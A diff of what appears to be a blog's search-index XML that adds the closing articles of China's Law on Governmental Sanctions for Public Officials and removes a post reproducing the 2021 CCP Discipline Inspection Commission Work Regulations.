+<p>　　<strong>第四十六条</strong>　政务处分决定书应当及时送达被处分人和被处分人所在机关、单位，并在一定范围内宣布。</p>
+<p>　　作出政务处分决定后，监察机关应当根据被处分人的具体身份书面告知相关的机关、单位。</p>
+<p>　　<strong>第四十七条</strong>　参与公职人员违法案件调查、处理的人员有下列情形之一的，应当自行回避，被调查人、检举人及其他有关人员也有权要求其回避：</p>
+<p>　　（一）是被调查人或者检举人的近亲属的；</p>
+<p>　　（二）担任过本案的证人的；</p>
+<p>　　（三）本人或者其近亲属与调查的案件有利害关系的；</p>
+<p>　　（四）可能影响案件公正调查、处理的其他情形。</p>
+<p>　　<strong>第四十八条</strong>　监察机关负责人的回避，由上级监察机关决定；其他参与违法案件调查、处理人员的回避，由监察机关负责人决定。</p>
+<p>　　监察机关或者上级监察机关发现参与违法案件调查、处理人员有应当回避情形的，可以直接决定该人员回避。</p>
+<p>　　<strong>第四十九条</strong>　公职人员依法受到刑事责任追究的，监察机关应当根据司法机关的生效判决、裁定、决定及其认定的事实和情节，依照本法规定给予政务处分。</p>
+<p>　　公职人员依法受到行政处罚，应当给予政务处分的，监察机关可以根据行政处罚决定认定的事实和情节，经立案调查核实后，依照本法给予政务处分。</p>
+<p>　　监察机关根据本条第一款、第二款的规定作出政务处分后，司法机关、行政机关依法改变原生效判决、裁定、决定等，对原政务处分决定产生影响的，监察机关应当根据改变后的判决、裁定、决定等重新作出相应处理。</p>
+<p>　　<strong>第五十条</strong>　监察机关对经各级人民代表大会、县级以上各级人民代表大会常务委员会选举或者决定任命的公职人员予以撤职、开除的，应当先依法罢免、撤销或者免去其职务，再依法作出政务处分决定。</p>
+<p>　　监察机关对经中国人民政治协商会议各级委员会全体会议或者其常务委员会选举或者决定任命的公职人员予以撤职、开除的，应当先依章程免去其职务，再依法作出政务处分决定。</p>
+<p>　　监察机关对各级人民代表大会代表、中国人民政治协商会议各级委员会委员给予政务处分的，应当向有关的人民代表大会常务委员会，乡、民族乡、镇的人民代表大会主席团或者中国人民政治协商会议委员会常务委员会通报。</p>
+<p>　　<strong>第五十一条</strong>　下级监察机关根据上级监察机关的指定管辖决定进行调查的案件，调查终结后，对不属于本监察机关管辖范围内的监察对象，应当交有管理权限的监察机关依法作出政务处分决定。</p>
+<p>　　<strong>第五十二条</strong>　公职人员涉嫌违法，已经被立案调查，不宜继续履行职责的，公职人员任免机关、单位可以决定暂停其履行职务。</p>
+<p>　　公职人员在被立案调查期间，未经监察机关同意，不得出境、辞去公职；被调查公职人员所在机关、单位及上级机关、单位不得对其交流、晋升、奖励、处分或者办理退休手续。</p>
+<p>　　<strong>第五十三条</strong>　监察机关在调查中发现公职人员受到不实检举、控告或者诬告陷害，造成不良影响的，应当按照规定及时澄清事实，恢复名誉，消除不良影响。</p>
+<p>　　<strong>第五十四条</strong>　公职人员受到政务处分的，应当将政务处分决定书存入其本人档案。对于受到降级以上政务处分的，应当由人事部门按照管理权限在作出政务处分决定后一个月内办理职务、工资及其他有关待遇等的变更手续；特殊情况下，经批准可以适当延长办理期限，但是最长不得超过六个月。</p>
+<h2 id="第五章-复审、复核"><a href="#第五章-复审、复核" class="headerlink" title="第五章　复审、复核"></a>第五章　复审、复核</h2><p>　　<strong>第五十五条</strong>　公职人员对监察机关作出的涉及本人的政务处分决定不服的，可以依法向作出决定的监察机关申请复审；公职人员对复审决定仍不服的，可以向上一级监察机关申请复核。</p>
+<p>　　监察机关发现本机关或者下级监察机关作出的政务处分决定确有错误的，应当及时予以纠正或者责令下级监察机关及时予以纠正。</p>
+<p>　　<strong>第五十六条</strong>　复审、复核期间，不停止原政务处分决定的执行。</p>
+<p>　　公职人员不因提出复审、复核而被加重政务处分。</p>
+<p>　　<strong>第五十七条</strong>　有下列情形之一的，复审、复核机关应当撤销原政务处分决定，重新作出决定或者责令原作出决定的监察机关重新作出决定：</p>
+<p>　　（一）政务处分所依据的违法事实不清或者证据不足的；</p>
+<p>　　（二）违反法定程序，影响案件公正处理的；</p>
+<p>　　（三）超越职权或者滥用职权作出政务处分决定的。</p>
+<p>　　<strong>第五十八条</strong>　有下列情形之一的，复审、复核机关应当变更原政务处分决定，或者责令原作出决定的监察机关予以变更：</p>
+<p>　　（一）适用法律、法规确有错误的；</p>
+<p>　　（二）对违法行为的情节认定确有错误的；</p>
+<p>　　（三）政务处分不当的。</p>
+<p>　　<strong>第五十九条</strong>　复审、复核机关认为政务处分决定认定事实清楚，适用法律正确的，应当予以维持。</p>
+<p>　　<strong>第六十条</strong>　公职人员的政务处分决定被变更，需要调整该公职人员的职务、职级、衔级、级别、岗位和职员等级或者薪酬待遇等的，应当按照规定予以调整。政务处分决定被撤销的，应当恢复该公职人员的级别、薪酬待遇，按照原职务、职级、衔级、岗位和职员等级安排相应的职务、职级、衔级、岗位和职员等级，并在原政务处分决定公布范围内为其恢复名誉。没收、追缴财物错误的，应当依法予以返还、赔偿。</p>
+<p>　　公职人员因有本法第五十七条、第五十八条规定的情形被撤销政务处分或者减轻政务处分的，应当对其薪酬待遇受到的损失予以补偿。</p>
+<h2 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章　法律责任"></a>第六章　法律责任</h2><p>　　<strong>第六十一条</strong>　有关机关、单位无正当理由拒不采纳监察建议的，由其上级机关、主管部门责令改正，对该机关、单位给予通报批评，对负有责任的领导人员和直接责任人员依法给予处理。</p>
+<p>　　<strong>第六十二条</strong>　有关机关、单位、组织或者人员有下列情形之一的，由其上级机关，主管部门，任免机关、单位或者监察机关责令改正，依法给予处理：</p>
+<p>　　（一）拒不执行政务处分决定的；</p>
+<p>　　（二）拒不配合或者阻碍调查的；</p>
+<p>　　（三）对检举人、证人或者调查人员进行打击报复的；</p>
+<p>　　（四）诬告陷害公职人员的；</p>
+<p>　　（五）其他违反本法规定的情形。</p>
+<p>　　<strong>第六十三条</strong>　监察机关及其工作人员有下列情形之一的，对负有责任的领导人员和直接责任人员依法给予处理：</p>
+<p>　　（一）违反规定处置问题线索的；</p>
+<p>　　（二）窃取、泄露调查工作信息，或者泄露检举事项、检举受理情况以及检举人信息的；</p>
+<p>　　（三）对被调查人或者涉案人员逼供、诱供，或者侮辱、打骂、虐待、体罚或者变相体罚的；</p>
+<p>　　（四）收受被调查人或者涉案人员的财物以及其他利益的；</p>
+<p>　　（五）违反规定处置涉案财物的；</p>
+<p>　　（六）违反规定采取调查措施的；</p>
+<p>　　（七）利用职权或者职务上的影响干预调查工作、以案谋私的；</p>
+<p>　　（八）违反规定发生办案安全事故，或者发生安全事故后隐瞒不报、报告失实、处置不当的；</p>
+<p>　　（九）违反回避等程序规定，造成不良影响的；</p>
+<p>　　（十）不依法受理和处理公职人员复审、复核的；</p>
+<p>　　（十一）其他滥用职权、玩忽职守、徇私舞弊的行为。</p>
+<p>　　<strong>第六十四条</strong>　违反本法规定，构成犯罪的，依法追究刑事责任。</p>
+<h2 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章　附则"></a>第七章　附则</h2><p>　　<strong>第六十五条</strong>　国务院及其相关主管部门根据本法的原则和精神，结合事业单位、国有企业等的实际情况，对事业单位、国有企业等的违法的公职人员处分事宜作出具体规定。</p>
+<p>　　<strong>第六十六条</strong>　中央军事委员会可以根据本法制定相关具体规定。</p>
+<p>　　<strong>第六十七条</strong>　本法施行前，已结案的案件如果需要复审、复核，适用当时的规定。尚未结案的案件，如果行为发生时的规定不认为是违法的，适用当时的规定；如果行为发生时的规定认为是违法的，依照当时的规定处理，但是如果本法不认为是违法或者根据本法处理较轻的，适用本法。</p>
+<p>　　<strong>第六十八条</strong>　本法自2020年7月1日起施行。</p>
+]]></content>
+      <categories>
+        <category>实体法规</category>
+      </categories>
+      <tags>
+        <tag>政务处分</tag>
       </tags>
   </entry>
   <entry>
@@ -3561,199 +3782,6 @@ sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span
       </tags>
   </entry>
   <entry>
-    <title>中国共产党纪律检查委员会工作条例（2021年12月24日）</title>
-    <url>/2025/08/03/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E6%A3%80%E6%9F%A5%E5%A7%94%E5%91%98%E4%BC%9A%E5%B7%A5%E4%BD%9C%E6%9D%A1%E4%BE%8B%EF%BC%882021%E5%B9%B412%E6%9C%8824%E6%97%A5%EF%BC%89/</url>
-    <content><![CDATA[<p>（2021年12月6日中共中央政治局会议审议批准 2021年12月 24 日中共中央发布）</p>
-<h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章　总则"></a>第一章　总则</h2><p>  <strong>第一条</strong>　为了加强和规范新时代党的纪律检查委员会工作，根据《中国共产党章程》，制定本条例。</p>
-<p>  <strong>第二条</strong>　党的各级纪律检查委员会高举中国特色社会主义伟大旗帜，以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，不忘初心、牢记使命，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，构建一体推进不敢腐、不能腐、不想腐体制机制，从严从实加强自身建设，自觉接受监督，充分发挥监督保障执行、促进完善发展作用。</p>
-<p>  <strong>第三条</strong>　党的各级纪律检查委员会是党内监督专责机关，是党推进全面从严治党、开展党风廉政建设和反腐败斗争的专门力量。</p>
-<p>  党的各级纪律检查委员会的主要任务是：维护党的章程和其他党内法规，检查党的理论和路线方针政策、党中央决策部署执行情况，协助党的委员会推进全面从严治党、加强党风建设和组织协调反腐败工作。</p>
-<p>  党的各级纪律检查委员会把坚决维护习近平总书记党中央的核心、全党的核心地位，维护党中央权威和集中统一领导作为最高政治原则和根本政治责任。</p>
-<p>  <strong>第四条</strong>　党的各级纪律检查委员会遵循以下原则开展工作：</p>
-<p>  （一）坚持党的全面领导，坚持党中央集中统一领导。</p>
-<p>  （二）坚持以人民为中心，践行党的根本宗旨和群众路线。</p>
-<p>  （三）坚持民主集中制，实行集体领导和个人分工负责相结合的制度。</p>
-<p>  （四）坚持严的主基调，全面从严、一严到底。</p>
-<p>  （五）坚持实事求是，依规依纪依法履行职责。</p>
-<p>  （六）坚持惩前毖后、治病救人，实现政治效果、纪法效果、社会效果有机统一。</p>
-<h2 id="第二章-领导体制"><a href="#第二章-领导体制" class="headerlink" title="第二章　领导体制"></a>第二章　领导体制</h2><p>  <strong>第五条</strong>　党的中央纪律检查委员会（国家监察委员会）在党中央领导下进行工作，履行党的最高纪律检查机关（国家最高监察机关）职责。</p>
-<p>  党的中央纪律检查委员会严格执行加强和维护党中央集中统一领导的各项制度要求，及时向中央政治局、中央政治局常务委员会请示汇报工作，研究重大事项、重要问题以及作出立案审查决定、给予党纪处分等事项向党中央请示报告。执行党中央重要决定的情况应当专题报告。</p>
-<p>  <strong>第六条</strong>　党的地方各级纪律检查委员会和基层纪律检查委员会在同级党的委员会和上级纪律检查委员会双重领导下进行工作。</p>
-<p>  党的地方各级纪律检查委员会和基层纪律检查委员会应当落实同级党的委员会推进全面从严治党、加强党风廉政建设和反腐败工作的部署，执行同级党委作出的决定，及时向同级党委汇报工作，按照规定请示报告重大事项。</p>
-<p>  上级党的纪律检查委员会加强对下级纪律检查委员会的领导，对下级纪委的工作作出部署、提出要求；督促指导和支持下级纪委开展同级监督，检查下级纪委的工作，定期听取工作汇报，开展政治和业务培训；坚持查办腐败案件以上级纪委领导为主，按照规定审议和批准下级纪委关于线索处置、立案审查、纪律处分等的请示报告，按照程序改变下级纪委作出的错误或者不当的决定，必要时直接审查或者组织、指挥审查下级纪委管辖范围内有重大影响或者复杂的案件。</p>
-<p>  <strong>第七条</strong>　党的中央纪律检查委员会与国家监察委员会合署办公，党的地方各级纪律检查委员会与地方各级监察委员会合署办公，实行一套工作机构、两个机关名称，履行党的纪律检查和国家监察两项职责，实现纪委监委领导体制和工作机制的统一融合，集中决策、一体运行，坚持纪严于法，执纪执法贯通。</p>
-<h2 id="第三章-产生和运行"><a href="#第三章-产生和运行" class="headerlink" title="第三章　产生和运行"></a>第三章　产生和运行</h2><p>  <strong>第八条</strong>　党的中央纪律检查委员会由党的全国代表大会选举产生，每届任期和党的中央委员会任期相同。</p>
-<p>  党的中央纪律检查委员会全体会议，选举常务委员会和书记、副书记，并报党的中央委员会批准。</p>
-<p>  <strong>第九条</strong>　中央纪律检查委员会委员应当政治坚定、对党忠诚、敢于斗争、担当作为、清正廉洁，具备组织领导纪律检查工作、推进党风廉政建设和反腐败斗争的能力。</p>
-<p>  中央纪律检查委员会委员应当认真履行以下职责：</p>
-<p>  （一）参加中央纪委全体会议，积极发表意见、提出建议。</p>
-<p>  （二）在纪律检查机关担负具体工作的委员，应当模范履行岗位职责，高质量完成所承担的纪律检查工作。</p>
-<p>  （三）未在纪律检查机关担负具体工作的委员，应当支持和帮助本地区、本部门、本单位纪律检查机关开展工作；了解所在地区、部门、单位党组织和党员领导干部遵守党章党规党纪、贯彻落实党中央决策部署等情况，提出意见建议，重要问题及时向中央纪委常委会反映。</p>
-<p>  （四）对中央纪委的工作，以及中央纪委常委、其他中央纪委委员进行监督。</p>
-<p>  （五）承担中央纪委安排的其他任务。</p>
-<p>  <strong>第十条</strong>　党的中央纪律检查委员会通过召开全体会议的方式行使以下职权：</p>
-<p>  （一）制定贯彻落实党的全国代表大会和党中央决议决定的重大部署、重大措施。</p>
-<p>  （二）听取和审议常务委员会工作报告。</p>
-<p>  （三）选举常务委员会和书记、副书记。</p>
-<p>  （四）讨论和决定纪检监察工作的重大问题、重大事项。</p>
-<p>  （五）按照权限审议重要党内法规或者规范性文件。</p>
-<p>  （六）决定或者追认给予中央纪委委员撤销党内职务以上处分。</p>
-<p>  （七）研究决定常务委员会提请决定的事项，或者应当由全体会议决定的其他重要事项。</p>
-<p>  <strong>第十一条</strong>　党的中央纪律检查委员会全体会议每年至少召开一次，由中央纪律检查委员会常务委员会召集并主持。</p>
-<p>  党的中央纪律检查委员会全体会议应当有三分之二以上委员到会方可召开。委员因故不能参加会议的应当在会前请假，其意见可以用书面形式表达。根据需要，可以安排有关人员列席会议。</p>
-<p>  根据讨论和决定事项的不同，采用举手、无记名投票等方式进行表决，赞成票超过应到会委员半数的为通过。</p>
-<p>  对中央纪律检查委员会委员给予撤销党内职务以上处分，必须由应到会委员三分之二以上的多数决定，报党中央批准。</p>
-<p>  <strong>第十二条</strong>　中央纪律检查委员会常务委员会贯彻落实党中央决策部署，以及中央纪律检查委员会全体会议的决定和部署，向全体会议报告工作，接受监督。在全体会议闭会期间，行使中央纪律检查委员会职权，主要包括：</p>
-<p>  （一）讨论向党的全国代表大会的工作报告，向党中央请示报告工作，学习贯彻党中央决策部署。</p>
-<p>  （二）召集全体会议，对拟提交全体会议讨论和决定的事项先行审议、提出意见。</p>
-<p>  （三）讨论和决定纪检监察工作的重要问题、重要事项。</p>
-<p>  （四）按照权限审议党内法规或者规范性文件。</p>
-<p>  （五）听取以中央纪委名义立案审查的有关案件情况通报。</p>
-<p>  （六）按照权限讨论和决定对违犯党纪的党组织、党员处理、处分等事项。</p>
-<p>  （七）决定给予中央纪委委员撤销党内职务以上处分，并报党中央批准，待召开全体会议时予以追认。</p>
-<p>  （八）按照干部管理权限审议干部任免事项。</p>
-<p>  （九）研究决定应当由常务委员会决定的其他重要事项。</p>
-<p>  <strong>第十三条</strong>　中央纪律检查委员会常务委员会会议一般定期召开，遇有重要情况可以随时召开。</p>
-<p>  中央纪律检查委员会常务委员会会议由中央纪委书记召集并主持，会议议题由书记确定。</p>
-<p>  中央纪律检查委员会常务委员会会议应当有半数以上常委会委员到会方可召开。审议干部任免事项必须有三分之二以上常委会委员到会。根据需要，可以安排有关人员列席会议。</p>
-<p>  讨论和决定重要问题，应当进行表决。涉及多个事项的，应当逐项表决。表决可以根据讨论和决定事项的不同，采用口头、举手、无记名投票或者记名投票等方式进行，赞成票超过应到会常委会委员半数的为通过。</p>
-<p>  <strong>第十四条</strong>　中央纪律检查委员会办公会议一般定期召开，遇有重要情况可以随时召开。办公会议由中央纪委书记召集并主持，会议议题由书记确定，驻委的副书记、常委会委员及有关负责同志参加。办公会议研究或者决定以下事项：</p>
-<p>  （一）学习贯彻党中央决策部署。</p>
-<p>  （二）机关日常工作中需要研究、决定或者通报的重要事项。</p>
-<p>  （三）按照权限讨论和决定对违犯党纪的党的组织、党员处理、处分等事项。</p>
-<p>  （四）按照干部管理权限讨论和决定有关干部任免事项。</p>
-<p>  （五）其他需要提交办公会议讨论的重要事项。</p>
-<p>  <strong>第十五条</strong>　中央纪律检查委员会机关根据工作需要，设立必要的内设机构，依照有关规定配置机构职能和权限。</p>
-<p>  <strong>第十六条</strong>　党的地方各级纪律检查委员会由同级党的代表大会选举产生，每届任期和同级党的委员会任期相同。</p>
-<p>  党的地方各级纪律检查委员会全体会议，选举常务委员会和书记、副书记，并由同级党的委员会通过，报上级党的委员会批准。</p>
-<p>  上级党的委员会可以根据工作需要，在下级党的代表大会闭会期间，调动、任免下级纪律检查委员会书记、副书记。</p>
-<p>  <strong>第十七条</strong>　党的地方各级纪律检查委员会通过召开全体会议的方式行使以下职权：</p>
-<p>  （一）制定贯彻落实党中央决策部署以及中央纪委工作部署，同级党的代表大会和党委决议决定、上级纪委工作要求的重大措施。</p>
-<p>  （二）听取和审议常务委员会工作报告。</p>
-<p>  （三）选举常务委员会和书记、副书记。</p>
-<p>  （四）讨论和决定管辖范围内纪检监察工作的重大问题、重大事项。</p>
-<p>  （五）按照权限审议规范性文件。</p>
-<p>  （六）决定或者追认给予本级纪委委员撤销党内职务以上处分。</p>
-<p>  （七）研究决定常务委员会提请决定的事项，或者应当由全体会议决定的其他重要事项。</p>
-<p>  <strong>第十八条</strong>　地方各级纪律检查委员会常务委员会贯彻落实党中央决策部署以及中央纪委工作部署，落实同级党委、上级纪委、本级纪委全体会议的工作部署，向全体会议报告工作，接受监督。在全体会议闭会期间，行使本级纪律检查委员会职权，主要包括：</p>
-<p>  （一）讨论向同级党的代表大会的工作报告，向同级党委和上级纪委请示报告工作。</p>
-<p>  （二）召集全体会议，对拟提交全体会议讨论和决定的事项先行审议、提出意见。</p>
-<p>  （三）讨论和决定管辖范围内纪检监察工作的重要问题、重要事项。</p>
-<p>  （四）按照权限审议规范性文件。</p>
-<p>  （五）听取以本级纪委名义立案审查的有关案件情况通报。</p>
-<p>  （六）按照权限讨论和决定对违犯党纪的党组织、党员处理、处分等事项。</p>
-<p>  （七）决定给予本级纪委委员撤销党内职务以上处分，并报同级党委批准后，按照规定报上一级纪委备案或者批准，待召开本级纪委全体会议时予以追认。</p>
-<p>  （八）按照干部管理权限审议干部任免事项。</p>
-<p>  （九）研究决定应当由常务委员会决定的其他重要事项。</p>
-<p>  <strong>第十九条</strong>　地方各级纪律检查委员会委员的任职条件、履职要求，全体会议和常务委员会会议的召开、表决，以及机关机构设置等事项，参照本条例第九条、第十一条、第十三条、第十五条的规定执行。</p>
-<p>  <strong>第二十条</strong>　党的基层委员会是设立纪律检查委员会，还是设立纪律检查委员，由它的上一级党组织根据有关规定和具体情况决定。</p>
-<p>  党的基层纪律检查委员会由党员大会或者党员代表大会选举产生，每届任期和同级党的委员会任期相同。</p>
-<p>  党的基层纪律检查委员会选出的书记、副书记，经同级党的委员会通过后，报上级党组织批准。</p>
-<p>  基层纪律检查委员会委员的任职条件、履职要求等事项，按照有关规定执行。</p>
-<p>  <strong>第二十一条</strong>　党的基层纪律检查委员会根据需要及时召开全体会议，传达学习党中央决策部署以及中央纪委工作部署，传达学习同级党委和上级纪委的工作部署，提出贯彻落实的具体措施，研究讨论管辖范围内纪律检查工作的重要问题、重要事项，按照权限讨论或者决定对违犯党纪的党组织、党员处理、处分等事项。</p>
-<p>  <strong>第二十二条</strong>　乡镇和企业、机关、高校等单位中的党的基层纪律检查委员会应当按照党章、本条例和其他党内法规的有关规定，结合实际建立健全议事规则、工作制度，注重发挥纪委委员在监督执纪、议事决策方面的作用，根据工作需要可以组织纪委委员参与监督执纪有关事项。</p>
-<p>  党的基层纪律检查委员会可以按照有关规定，设立必要的工作机构，配备专职工作人员。</p>
-<p>  党的基层纪律检查委员会应当指导和督促同级党的委员会所属基层党组织纪律检查委员履行职责、发挥作用。</p>
-<p>  <strong>第二十三条</strong>　因调离本地区、辞去公职、退休等原因不适宜继续担任纪律检查委员会委员职务的，应当辞去或者按照程序免去其纪委委员职务。死亡、丧失国籍、被追究刑事责任、被停止党籍、受到撤销党内职务以上处分的，其纪委委员职务自动终止。辞去、免去或者自动终止地方纪委委员、基层纪委委员职务的，应当报上一级党的委员会备案。</p>
-<h2 id="第四章-主要任务"><a href="#第四章-主要任务" class="headerlink" title="第四章　主要任务"></a>第四章　主要任务</h2><p>  <strong>第二十四条</strong>　党的各级纪律检查委员会坚定维护党章，促进党组织和党员牢固树立党章意识、严格遵守党章规定，发挥党章作为管党治党总章程的作用，以严明的纪律巩固党的团结统一。切实维护各项党内法规，有规必依、执规必严、违规必究，保证党内法规得到有效执行，促进依规治党。</p>
-<p>  <strong>第二十五条</strong>　党的各级纪律检查委员会检查党的理论和路线方针政策的执行情况，坚持服务党和国家工作大局，坚决维护党中央权威和集中统一领导，推动党组织和党员统一意志、统一行动。加强对党中央决策部署落实情况的监督检查，坚持跟进监督、精准监督、全程监督，督促党组织和党员履职尽责、担当作为，确保党中央政令畅通、令行禁止。</p>
-<p>  <strong>第二十六条</strong>　党的各级纪律检查委员会协助同级党的委员会推进全面从严治党：</p>
-<p>  （一）协助同级党委制定全面从严治党规划、计划，推动各项工作落实。</p>
-<p>  （二）推动全面从严治党主体责任制度执行，检查同级党委领导班子成员包括“一把手”管党治党责任落实情况，监督下级党组织落实主体责任情况。</p>
-<p>  （三）加强对同级党委领导班子监督，发现班子成员包括“一把手”履职尽责、廉洁自律等方面重要问题，按照规定如实报告。</p>
-<p>  （四）协助同级党委加强对本地区本单位政治生态、党风廉政等情况分析，有关问题向同级党委报告并提出意见建议。</p>
-<p>  （五）协助同级党委开展巡视巡察工作。</p>
-<p>  （六）对日常监督、巡视巡察、审计监督等发现问题整改情况开展检查，通过加强监督推动整改常态化。</p>
-<p>  （七）协助起草相关党内法规和规范性文件。</p>
-<p>  （八）参与党委组织的管党治党有关专项工作。</p>
-<p>  坚持履行协助职责和监督责任有机结合，促进全面从严治党党委主体责任和纪委监督责任贯通协同。</p>
-<p>  <strong>第二十七条</strong>　党的各级纪律检查委员会协助同级党的委员会加强党风建设，锲而不舍落实中央八项规定精神，大力弘扬党的光荣传统和优良作风，驰而不息纠治形式主义、官僚主义、享乐主义和奢靡之风，坚决纠正损害群众利益的不正之风，保持党同人民群众的血肉联系。</p>
-<p>  <strong>第二十八条</strong>　党的各级纪律检查委员会协助同级党的委员会组织协调反腐败工作，坚定不移推进反腐败斗争，坚持和完善党中央集中统一领导、各级党委统筹指挥、纪委监委组织协调、职能部门高效协同、人民群众支持参与的反腐败工作体制机制。</p>
-<p>  发挥党委反腐败协调机构的统筹协调作用，开展反腐败国际追逃追赃等工作，加强相关部门协作配合，增强反腐败整体合力。</p>
-<p>  <strong>第二十九条</strong>　党的纪律检查工作坚持把一体推进不敢腐、不能腐、不想腐作为反腐败斗争的基本方针、新时代全面从严治党的重要方略，惩治震慑、制度约束、提高觉悟一体发力，系统施治、标本兼治，努力取得更多制度性成果和更大治理成效：</p>
-<p>  （一）坚持无禁区、全覆盖、零容忍，坚持重遏制、强高压、长震慑，坚持受贿行贿一起查，巩固不敢腐。</p>
-<p>  （二）坚持将惩治腐败与深化改革、促进治理贯通起来，深入查找制度和体制机制存在的问题，推动补齐制度短板、堵塞监管漏洞、规范权力运行，强化不能腐。</p>
-<p>  （三）坚持教育党员、干部坚定理想信念宗旨，提高党性觉悟，提升道德修养，涵养廉洁文化，筑牢思想上拒腐防变的堤坝，自觉不想腐。</p>
-<p>  <strong>第三十条</strong>　发挥党的纪律检查工作在党和国家监督体系中的重要作用，强化对权力运行的制约和监督，重点加强对领导干部特别是主要领导干部的监督，提升监督全覆盖质量，增强监督的政治性、严肃性、协同性、有效性。</p>
-<p>  深化纪检监察体制改革，推进纪律监督、监察监督、派驻监督、巡视监督统筹衔接，整合运用监督力量，构建系统集成、协同高效的监督机制。坚持以党内监督为主导，促进人大监督、民主监督、行政监督、司法监督、审计监督、财会监督、统计监督、群众监督、舆论监督等各类监督有机贯通、相互协调，健全信息沟通、线索移交、措施配合、成果共享等机制，形成常态长效的监督合力。</p>
-<h2 id="第五章-工作职责"><a href="#第五章-工作职责" class="headerlink" title="第五章　工作职责"></a>第五章　工作职责</h2><p>  <strong>第三十一条</strong>　党的各级纪律检查委员会围绕实现党章赋予的任务，坚持聚焦主责主业，履行监督、执纪、问责职责。</p>
-<p>  坚持把监督作为基本职责，抓早抓小、防微杜渐，综合考虑错误性质、情节后果、主观态度等因素，依规依纪依法、精准有效运用监督执纪“四种形态”：</p>
-<p>  （一）党员、干部有作风纪律方面的苗头性、倾向性问题或者轻微违纪问题，或者有一般违纪问题但具备免予处分情形的，运用监督执纪第一种形态，按照规定进行谈话提醒、批评教育、责令检查等，或者予以诫勉。</p>
-<p>  （二）党员、干部有一般违纪问题，或者违纪问题严重但具有主动交代等从轻减轻处分情形的，运用监督执纪第二种形态，按照规定给予警告、严重警告处分，或者建议单处、并处停职检查、调整职务、责令辞职、免职等处理。</p>
-<p>  （三）党员、干部有严重违纪问题，或者严重违纪并构成严重职务违法的，运用监督执纪第三种形态，按照规定给予撤销党内职务、留党察看、开除党籍处分，同时建议给予降职或者依法给予撤职、开除公职、调整其享受的待遇等处理。</p>
-<p>  （四）党员、干部严重违纪、涉嫌犯罪的，运用监督执纪第四种形态，按照规定给予开除党籍处分，同时依法给予开除公职、调整或者取消其享受的待遇等处理，再移送司法机关依法追究刑事责任。</p>
-<p>  <strong>第三十二条</strong>　党的各级纪律检查委员会应当把自觉遵守纪律的教育作为基础性工作，经常开展党章党规教育，强化党的政治纪律、组织纪律、廉洁纪律、群众纪律、工作纪律、生活纪律教育，深入开展警示教育，以案明纪、以案说法。</p>
-<p>  开展廉政教育，加强全面从严治党、党风廉政建设和反腐败工作的形势任务以及家风家教等宣传教育，推进廉洁文化建设，营造崇廉拒腐氛围。</p>
-<p>　　根据形势需要，着眼保障党的中心工作，作出维护党纪的决定，制定相关法规文件，严明纪律要求，教育、引导和规范党组织、党员行为。</p>
-<p>  <strong>第三十三条</strong>　党的纪律检查委员会应当强化政治监督，重点监督党组织、党员特别是领导干部以下情况：</p>
-<p>  （一）对党忠诚，坚持党的领导，贯彻落实党的理论和路线方针政策、党中央决策部署，践行“两个维护”的情况。</p>
-<p>  （二）坚定理想信念宗旨，牢记初心使命，践行入党誓词，坚持中国特色社会主义制度的情况。</p>
-<p>  （三）落实全面从严治党主体责任和监督责任的情况。</p>
-<p>  （四）贯彻执行民主集中制，公正用权、依法用权、廉洁用权、担当作为的情况。</p>
-<p>  政治监督应当突出“关键少数”，重点加强对“一把手”、同级党委特别是常委会委员的监督。</p>
-<p>  <strong>第三十四条</strong>　党的纪律检查委员会应当加强日常监督，监督方式主要包括：座谈，召集、参加或者列席会议，了解党内同志和社会群众反映；查阅查询相关资料和信息数据；现场调查，驻点监督；督促巡视巡察整改；谈心谈话，听取工作汇报，听取述责述廉；建立健全党员领导干部廉政档案，开展党风廉政意见回复等工作。</p>
-<p>  开展专项监督，针对落实党中央决策部署中的突出问题，行业性、系统性、区域性的管党治党重点问题，形式主义、官僚主义、享乐主义和奢靡之风问题，群众反映强烈、损害群众利益的突出问题加强监督检查。必要时，可以组织、参加或者督促开展集中整治、专项治理。</p>
-<p>  加强基层监督，促进基层监督资源和力量整合，发挥纪检监察、巡察等作用，有效衔接村（居）务监督，建立监督信息网络平台，扩大群众参与，及时发现、处理群众身边的腐败问题和不正之风。</p>
-<p>  <strong>第三十五条</strong>　党的各级纪律检查委员会应当畅通信访举报渠道，依规依纪受理党员群众的信访举报，健全分办、交办、督办、反馈等工作机制。</p>
-<p>  对信访举报情况应当定期分析研判，对反映的典型性、普遍性、苗头性问题提出有针对性的工作建议，形成综合分析或者专题分析材料，向同级党委、上级纪委报告或者向有关党组织通报。</p>
-<p>  对于信访举报反映、监督执纪中发现以及巡视巡察机构和其他单位移交的问题线索，应当实行集中管理，采取谈话函询、初步核实、暂存待查、予以了结等方式分类处置，做到件件有着落。</p>
-<p>  <strong>第三十六条</strong>　党的各级纪律检查委员会对反映党组织、党员的问题线索经过初步核实，对于涉嫌违纪、需要追究党纪责任的，应当按照规定予以立案审查。</p>
-<p>  各级纪律检查委员会按照管理权限，审查违反党章和其他党内法规的比较重要或者复杂的案件，主要包括：同级党委委员、候补委员，同级纪委委员，同级党委管理的党员干部，以及同级党委工作部门，同级党委批准设立的党组（党委），下一级党委、纪委等涉嫌违纪案件；案情重大复杂，需要采取重要审查措施的案件；同级党委、上级纪委交办的其他案件。</p>
-<p>  地方各级纪律检查委员会和基层纪律检查委员会对于处理涉及同级党委委员、候补委员，同级党委管理的正职领导干部，同级纪委常委、监委委员等人员的案件，以及涉及政治问题、国家安全等特别重要或者复杂案件中的问题和处理的结果，在向同级党委报告的同时，即向上级纪委一并报告。</p>
-<p>  纪律审查工作应当依规依纪采取谈话、查询、调取、暂扣、封存、勘验检查、鉴定等措施，以及通过要求相关组织作出说明等方式，收集证据，查明事实，处置违纪所得。</p>
-<p>  <strong>第三十七条</strong>　党的各级纪律检查委员会根据纪律审查结果，依据相关党内法规，对应当追究党纪责任的党组织和党员进行纪律处理、处分。</p>
